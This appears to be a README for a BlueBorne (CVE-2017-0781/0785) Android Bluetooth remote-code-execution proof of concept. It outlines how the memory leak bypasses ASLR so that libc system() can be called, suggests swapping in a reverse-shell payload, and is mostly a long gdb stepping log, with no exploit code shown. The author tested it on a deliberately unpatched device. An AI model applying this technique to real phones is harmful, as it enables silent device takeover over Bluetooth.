# android712-blueborne

Android Blueborne RCE CVE-2017-0781

In November 2017 a company called Armis published a proof of concept (PoC) of a remote code execution vulnerability in Android via Bluetooth (CVE-2017-0781), known as BlueBorne. Although BlueBorne refers to a set of 8 vulnerabilities, this PoC in this article uses only 2 of them to achieve its goal.

BlueBorne only requires that a Bluetooth connection on a device be active. No user action is required, with devices not even needing to be paired. All a hacker needs to do is be in Bluetooth range of your device to take it over.


The exploitation process is divided into 2 phases, first the memory leak vulnerability (CVE-2017-0785) is used to know the memory addresses and bypass the ASLR protection, and thus make a call to the function libc library system and execute code on the phone, create a file ("/data/local/tmp/test"). You can change the payload what you want, including making the Mobile connect to you (reverse shell).

In this article I want to show that it is possible to execute and/or take over an affected phone (those without BlueBorne patch, without Android’s September 2017 security patch).

If you are interested below are the debugger logs and exection log, along with proof of payload exection.

For testing purposes removed the CVE-2017-0781 patches and compiled Android 7.1.2 (LineageOS CM 14.1) on my test mobile Samsung S3 Neo+ GT-9301I

More info here:

https://github.com/marcinguy/S3NEO--GT301I



After dozen of executions got this condition in. Each execution is around 2-3 sec. So you can own/take over the mobile in less than a half of the minute.


```asm
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "arm-linux-androideabi".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word".
(gdb) attach 15513
Attaching to process 15513
[New LWP 15518]
[New LWP 15519]
[New LWP 15520]
[New LWP 15521]
[New LWP 15522]
[New LWP 15523]
[New LWP 15524]
[New LWP 15525]
[New LWP 15526]
[New LWP 15529]
[New LWP 15530]
[New LWP 15531]
[New LWP 15532]
[New LWP 15533]
[New LWP 15534]
[New LWP 15535]
[New LWP 15536]
[New LWP 15537]
[New LWP 15538]
[New LWP 15539]
[New LWP 15541]
[New LWP 15540]
[New LWP 15543]
[New LWP 15544]
[New LWP 15545]
[New LWP 15546]
[New LWP 15547]
[New LWP 15548]
[New LWP 15549]
[New LWP 15550]
[New LWP 15551]
[New LWP 15552]
[New LWP 15556]
[New LWP 15557]
[New LWP 15558]
[New LWP 15559]
[New LWP 15560]
[New LWP 15562]
[New LWP 15563]
[New LWP 15565]
[New LWP 15569]
[New LWP 15570]
[New LWP 15577]
[New LWP 15578]
0xb5219114 in __epoll_pwait () from target:/system/lib/libc.so
(gdb) b *0xb5216b4d
warning: Breakpoint address adjusted from 0xb5216b4d to 0xb5216b4c.
Breakpoint 1 at 0xb5216b4c
(gdb) disass system
Dump of assembler code for function system:
   0xb5216b4c <+0>:	push	{r4, r5, r6, lr}
   0xb5216b4e <+2>:	sub	sp, #72	; 0x48
   0xb5216b50 <+4>:	ldr	r1, [pc, #236]	; (0xb5216c40 <system+244>)
   0xb5216b52 <+6>:	cmp	r0, #0
   0xb5216b54 <+8>:	ldr	r2, [pc, #236]	; (0xb5216c44 <system+248>)
   0xb5216b56 <+10>:	add	r1, pc
   0xb5216b58 <+12>:	ldr	r1, [r1, #0]
   0xb5216b5a <+14>:	add	r2, pc
   0xb5216b5c <+16>:	vld1.64	{d16-d17}, [r2]
   0xb5216b60 <+20>:	ldr	r1, [r1, #0]
   0xb5216b62 <+22>:	str	r1, [sp, #68]	; 0x44
   0xb5216b64 <+24>:	add	r1, sp, #48	; 0x30
   0xb5216b66 <+26>:	vst1.64	{d16-d17}, [r1]
   0xb5216b6a <+30>:	beq.n	0xb5216bf6 <system+170>
   0xb5216b6c <+32>:	add	r4, sp, #12
   0xb5216b6e <+34>:	str	r0, [sp, #56]	; 0x38
   0xb5216b70 <+36>:	mov	r0, r4
   0xb5216b72 <+38>:	blx	0xb51e4a38 <sigemptyset@plt>
   0xb5216b76 <+42>:	mov	r0, r4
   0xb5216b78 <+44>:	movs	r1, #17
   0xb5216b7a <+46>:	blx	0xb51e511c <sigaddset@plt>
   0xb5216b7e <+50>:	add	r2, sp, #8
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) cont
Continuing.
[New LWP 15912]
[Switching to LWP 15540]
warning: Breakpoint 1 address previously adjusted from 0xb5216b4d to 0xb5216b4c.

Thread 23 "bt_workqueue" hit Breakpoint 1, 0xb5216b4c in system ()
   from target:/system/lib/libc.so
(gdb) stepi
[New LWP 17151]
0xb5216b4e in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b50 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b52 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b54 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b56 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b58 in system () from target:/system/lib/libc.so
(gdb) 
[New LWP 17181]
0xb5216b5a in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b5c in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b60 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b62 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b64 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b66 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b6a in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b6c in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b6e in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b70 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b72 in system () from target:/system/lib/libc.so
(gdb) 
0xb51e4a38 in sigemptyset@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e4a3c in sigemptyset@plt () from target:/system/lib/libc.so
(gdb) 
[New LWP 17215]
0xb51e4a40 in sigemptyset@plt () from target:/system/lib/libc.so
(gdb) 
0xb51ede72 in sigemptyset () from target:/system/lib/libc.so
(gdb) 
0xb51ede74 in sigemptyset () from target:/system/lib/libc.so
(gdb) 
0xb51ede76 in sigemptyset () from target:/system/lib/libc.so
(gdb) 
[New LWP 17351]
0xb51ede78 in sigemptyset () from target:/system/lib/libc.so
(gdb) 
0xb51ede7a in sigemptyset () from target:/system/lib/libc.so
(gdb) 
0xb5216b76 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b78 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b7a in system () from target:/system/lib/libc.so
(gdb) 
0xb51e511c in sigaddset@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e5120 in sigaddset@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e5124 in sigaddset@plt () from target:/system/lib/libc.so
(gdb) 
0xb51eddf4 in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb51eddf6 in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb51eddf8 in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb51eddfa in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb51eddfc in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb51eddfe in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb51ede00 in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb51ede02 in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb51ede06 in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb51ede0a in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb51ede0c in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb51ede10 in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb51ede14 in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb51ede18 in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb51ede1a in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb51ede1e in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb51ede20 in sigaddset () from target:/system/lib/libc.so
(gdb) 
0xb5216b7e in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b80 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b82 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b84 in system () from target:/system/lib/libc.so
(gdb) 
0xb51e45ac in sigprocmask@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e45b0 in sigprocmask@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e45b4 in sigprocmask@plt () from target:/system/lib/libc.so
(gdb) 
0xb6f28fbc in sigprocmask ()
(gdb) 
0xb6f28fc0 in sigprocmask ()
(gdb) 
0xb6f28fc2 in sigprocmask ()
(gdb) 
0xb6f28fc4 in sigprocmask ()
(gdb) 
0xb6f28fc6 in sigprocmask ()
(gdb) 
0xb6f28fc8 in sigprocmask ()
(gdb) 
0xb6f28fca in sigprocmask ()
(gdb) 
0xb6f28fcc in sigprocmask ()
(gdb) 
0xb6f28fce in sigprocmask ()
(gdb) 
0xb6f28fd0 in sigprocmask ()
(gdb) 
0xb6f28fd2 in sigprocmask ()
(gdb) 
0xb6f28fd4 in sigprocmask ()
(gdb) 
0xb6f28fd6 in sigprocmask ()
(gdb) 
0xb6f28fd8 in sigprocmask ()
(gdb) 
0xb6f28fda in sigprocmask ()
(gdb) 
0xb6f28fdc in sigprocmask ()
(gdb) 
0xb6f28fde in sigprocmask ()
(gdb) 
0xb6f28fe0 in sigprocmask ()
(gdb) 
0xb6f28fe2 in sigprocmask ()
(gdb) 
0xb6f28fe4 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 

0xb6f28fea in sigprocmask ()
(gdb) 

0xb6f28ffe in sigprocmask ()
(gdb) 

0xb6f29000 in sigprocmask ()
(gdb) 

0xb6f29002 in sigprocmask ()
(gdb) 

0xb6f29004 in sigprocmask ()
(gdb) 

0xb6f28fe8 in sigprocmask ()
(gdb) 

0xb6f28fea in sigprocmask ()
(gdb) 

0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
[New LWP 17375]

0xb6f29002 in sigprocmask ()
(gdb) 

0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28fec in sigprocmask ()
(gdb) 
0xb6f28fee in sigprocmask ()
(gdb) 
0xb6f28ff0 in sigprocmask ()
(gdb) 
0xb6f28460 in sigismember@plt ()
(gdb) 
0xb6f28464 in sigismember@plt ()
(gdb) 
0xb6f28468 in sigismember@plt ()
(gdb) 
0xb51edea8 in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb51edeaa in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb51edeac in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb51edeae in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb51edeb0 in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb51edeb2 in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb51edeb4 in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb51edeb6 in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb51edeba in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb51edebe in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb51edec0 in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb51edec4 in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb51edec8 in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb51edecc in sigismember () from target:/system/lib/libc.so
(gdb) 
0xb6f28ff4 in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
[New LWP 17435]
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 

0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 

0xb6f29002 in sigprocmask ()
(gdb) 

0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 

[New LWP 17464]

0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 

0xb6f29004 in sigprocmask ()
(gdb) 

0xb6f28fe8 in sigprocmask ()
(gdb) 

0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
